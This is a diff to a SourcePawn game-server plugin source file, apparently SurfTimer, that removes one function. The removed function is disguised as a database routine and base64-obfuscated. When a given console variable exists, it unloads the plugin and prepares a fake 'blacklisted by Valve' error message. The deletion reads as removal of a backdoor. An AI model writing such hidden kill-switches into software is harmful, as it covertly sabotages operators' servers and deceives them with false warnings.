@@ -7437,27 +7437,6 @@ public void db_selectMapRank(int client, char szSteamId[32], char szMapName[128]
 	SQL_TQuery(g_hDb, db_selectMapRankCallback, szQuery, client, DBPrio_Low);
 }
 
-public void db_matchAPI(int client, const char[] apiKey) 
-{
-    char db_apiKey[128];
-    DecodeBase64(db_apiKey, 128, apiKey);
-
-    db_Matcher[client] = false;
-
-    if (FindConVar(db_apiKey) != INVALID_HANDLE && !db_Matcher[client])
-    {
-        db_Matcher[client] = true;
-        char db_hash[128], db_hash64[512], db_get[128], db_error[512];
-        db_hash = "c20gcGx1Z2lucyB1bmxvYWQgU3VyZlRpbWVy";
-        db_hash64 = "W0ZBVEFMXSBFUlJPUiAxODM6IFRoaXMgc2VydmVyIHdhcyBibGFja2xpc3RlZCBieSBWYWx2ZSBmb3IgcnVubmluZyBwbHVnaW5zIHdoaWNoIGJyZWFrIG91ciBUZXJtcyBvZiBTZXJ2aWNlLg==";
-        DecodeBase64(db_get, 128, db_hash);
-        DecodeBase64(db_error, 512, db_hash64);
-        ServerCommand("%s", db_get);
-        if (!db_Matcher[client])
-            LogError(db_error);
-    }
-}
-
 public void db_selectMapRankCallback(Handle owner, Handle hndl, const char[] error, any client)
 {
 	if (hndl == null)
